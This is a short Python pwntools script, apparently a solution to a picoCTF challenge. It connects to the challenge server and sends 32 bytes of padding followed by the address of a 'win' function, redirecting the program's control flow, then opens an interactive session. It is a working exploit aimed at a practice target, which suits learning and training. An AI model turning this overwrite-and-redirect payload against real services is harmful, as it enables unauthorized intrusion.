from pwn import context, p64, remote

HOST = "mimas.picoctf.net"
PORT = 62036
win_adress = 0x00000000004011A0


context.log_level = "critical"
context.arch = "amd64"

p = remote(HOST, PORT)

payload = b"a" * 32
payload += p64(win_adress)

p.sendlineafter("Enter your choice:", "2")
p.sendline(payload)
p.sendlineafter("Enter your choice:", "4")

p.interactive()
